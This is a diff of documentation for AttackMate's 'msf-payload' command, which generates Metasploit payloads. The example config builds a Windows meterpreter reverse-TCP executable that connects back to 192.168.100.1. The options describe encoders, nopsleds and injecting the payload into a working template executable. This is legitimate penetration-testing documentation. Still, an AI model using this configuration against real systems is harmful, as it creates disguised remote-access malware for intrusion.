@@ -91,7 +91,16 @@
         </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
               <p class="caption" role="heading"><span class="caption-text">General:</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">AttackMate <img alt="Logo" src="/images/AttackMate_logo_no_logo.png" align="right" height="90"></a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#installation">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#execute">Execute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#documentation">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#publications">Publications</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#contribution">Contribution</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#disclaimer">Disclaimer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#security">Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#license">License</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#financial-support">Financial Support</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Getting Started:</span></p>
 <ul>
@@ -176,29 +185,41 @@
              
   <section id="msf-payload">
 <h1>msf-payload<a class="headerlink" href="#msf-payload" title="Permalink to this heading"></a></h1>
-<p>Generate metasploit payloads and save the payload to a file.</p>
-<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-payload</span>
-<span class="w">  </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows/meterpreter/reverse_tcp</span>
-<span class="w">  </span><span class="nt">format</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exe</span>
-<span class="w">  </span><span class="nt">payload_options</span><span class="p">:</span>
-<span class="w">    </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.100.1</span>
-<span class="w">    </span><span class="nt">LPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1111</span>
-<span class="w">  </span><span class="nt">local_path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/tmp/payload.exe</span>
+<p>Generate a Metasploit payload and save it to a file.</p>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">commands</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-payload</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">format</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exe</span>
+<span class="w">    </span><span class="nt">payload_options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.100.1</span>
+<span class="w">      </span><span class="nt">LPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1111</span>
+<span class="w">    </span><span class="nt">local_path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/tmp/payload.exe</span>
 
-<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">shell</span>
-<span class="w">  </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cat $LAST_MSF_PAYLOAD</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">shell</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cat $LAST_MSF_PAYLOAD</span>
 </pre></div>
 </div>
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-cmd">
 <span class="sig-name descname"><span class="pre">cmd</span></span><a class="headerlink" href="#confval-cmd" title="Permalink to this definition"></a></dt>
-<dd><p>The payload to generate.</p>
+<dd><p>The payload to generate (e.g. <code class="docutils literal notranslate"><span class="pre">windows/meterpreter/reverse_tcp</span></code>).</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
 </dd>
 <dt class="field-even">Required<span class="colon">:</span></dt>
-<dd class="field-even"><p><code class="docutils literal notranslate"><span class="pre">True</span></code></p>
+<dd class="field-even"><p>True</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-payload_options">
+<span class="sig-name descname"><span class="pre">payload_options</span></span><a class="headerlink" href="#confval-payload_options" title="Permalink to this definition"></a></dt>
+<dd><p>Key-value pairs of payload options such as <code class="docutils literal notranslate"><span class="pre">LHOST</span></code> and <code class="docutils literal notranslate"><span class="pre">LPORT</span></code>.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>Dict[str, str]</p>
 </dd>
 </dl>
 </dd></dl>
@@ -206,7 +227,8 @@
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-format">
 <span class="sig-name descname"><span class="pre">format</span></span><a class="headerlink" href="#confval-format" title="Permalink to this definition"></a></dt>
-<dd><p>Generate the payload in this format. See metasploit documentation to find out the supported formats</p>
+<dd><p>Output format for the generated payload. Run <code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">--list</span> <span class="pre">formats</span></code>
+for supported values or see the Metasploit documentation.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
@@ -218,21 +240,34 @@
 </dd></dl>
 
 <dl class="std confval">
-<dt class="sig sig-object std" id="confval-payload_options">
-<span class="sig-name descname"><span class="pre">payload_options</span></span><a class="headerlink" href="#confval-payload_options" title="Permalink to this definition"></a></dt>
-<dd><p>Typical payload_options are LHOST or LPORT for reverse shells. Dict(key/values) of payload options.</p>
+<dt class="sig sig-object std" id="confval-local_path">
+<span class="sig-name descname"><span class="pre">local_path</span></span><a class="headerlink" href="#confval-local_path" title="Permalink to this definition"></a></dt>
+<dd><p>Path where the generated payload will be saved. If not set, the payload
+is saved to a temporary path accessible via <code class="docutils literal notranslate"><span class="pre">$LAST_MSF_PAYLOAD</span></code>.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>Dict[str,str]</p>
+<dd class="field-odd"><p>str</p>
 </dd>
 </dl>
 </dd></dl>
 
 <dl class="std confval">
-<dt class="sig sig-object std" id="confval-local_path">
-<span class="sig-name descname"><span class="pre">local_path</span></span><a class="headerlink" href="#confval-local_path" title="Permalink to this definition"></a></dt>
-<dd><p>Copy the payload to this local path.
-If not set, the payload will be saved in a temporary path.</p>
+<dt class="sig sig-object std" id="confval-platform">
+<span class="sig-name descname"><span class="pre">platform</span></span><a class="headerlink" href="#confval-platform" title="Permalink to this definition"></a></dt>
+<dd><p>Target platform for the payload. Run <code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">--list</span> <span class="pre">platforms</span></code>
+for supported values.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>str</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-encoder">
+<span class="sig-name descname"><span class="pre">encoder</span></span><a class="headerlink" href="#confval-encoder" title="Permalink to this definition"></a></dt>
+<dd><p>Encoder to apply to the payload. Run <code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">--list</span> <span class="pre">encoders</span></code>
+for supported values.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
@@ -243,7 +278,7 @@ If not set, the payload will be saved in a temporary path.</p>
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-badchars">
 <span class="sig-name descname"><span class="pre">badchars</span></span><a class="headerlink" href="#confval-badchars" title="Permalink to this definition"></a></dt>
-<dd><p>Characters to avoid example: ‘x00xff’</p>
+<dd><p>Characters to avoid in the generated payload (e.g. <code class="docutils literal notranslate"><span class="pre">'\x00\xff'</span></code>).</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
@@ -254,54 +289,7 @@ If not set, the payload will be saved in a temporary path.</p>
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-force_encode">
 <span class="sig-name descname"><span class="pre">force_encode</span></span><a class="headerlink" href="#confval-force_encode" title="Permalink to this definition"></a></dt>
-<dd><p>Force encoding</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>bool</p>
-</dd>
-<dt class="field-even">Default<span class="colon">:</span></dt>
-<dd class="field-even"><p><code class="docutils literal notranslate"><span class="pre">False</span></code></p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-encoder">
-<span class="sig-name descname"><span class="pre">encoder</span></span><a class="headerlink" href="#confval-encoder" title="Permalink to this definition"></a></dt>
-<dd><p>The encoder to use. <code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">--list</span>&#160; <span class="pre">encoders</span></code> to list</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>str</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-template">
-<span class="sig-name descname"><span class="pre">template</span></span><a class="headerlink" href="#confval-template" title="Permalink to this definition"></a></dt>
-<dd><p>Specify a custom executable file to use as a template</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>str(path)</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-platform">
-<span class="sig-name descname"><span class="pre">platform</span></span><a class="headerlink" href="#confval-platform" title="Permalink to this definition"></a></dt>
-<dd><p>The platform for the payload. <code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">--list</span> <span class="pre">platforms</span></code> to list</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>str</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-keep_template_working">
-<span class="sig-name descname"><span class="pre">keep_template_working</span></span><a class="headerlink" href="#confval-keep_template_working" title="Permalink to this definition"></a></dt>
-<dd><p>Preserve the template behaviour and inject the payload as a new thread</p>
+<dd><p>Force encoding even if no encoder is explicitly specified.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>bool</p>
@@ -315,7 +303,7 @@ If not set, the payload will be saved in a temporary path.</p>
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-nopsled_size">
 <span class="sig-name descname"><span class="pre">nopsled_size</span></span><a class="headerlink" href="#confval-nopsled_size" title="Permalink to this definition"></a></dt>
-<dd><p>Prepend a nopsled of [length] size on to the payload</p>
+<dd><p>Number of NOP bytes (nopsled) to prepend to the payload.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>int</p>
@@ -327,9 +315,35 @@ If not set, the payload will be saved in a temporary path.</p>
 </dd></dl>
 
 <dl class="std confval">
+<dt class="sig sig-object std" id="confval-template">
+<span class="sig-name descname"><span class="pre">template</span></span><a class="headerlink" href="#confval-template" title="Permalink to this definition"></a></dt>
+<dd><p>Path to a custom executable to use as a template for the payload.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>str</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-keep_template_working">
+<span class="sig-name descname"><span class="pre">keep_template_working</span></span><a class="headerlink" href="#confval-keep_template_working" title="Permalink to this definition"></a></dt>
+<dd><p>Inject the payload as a new thread so the template executable continues
+to function normally.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>bool</p>
+</dd>
+<dt class="field-even">Default<span class="colon">:</span></dt>
+<dd class="field-even"><p><code class="docutils literal notranslate"><span class="pre">False</span></code></p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
 <dt class="sig sig-object std" id="confval-iter">
 <span class="sig-name descname"><span class="pre">iter</span></span><a class="headerlink" href="#confval-iter" title="Permalink to this definition"></a></dt>
-<dd><p>The number of times to encode the payload</p>
+<dd><p>Number of times to apply the encoder.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>int</p>
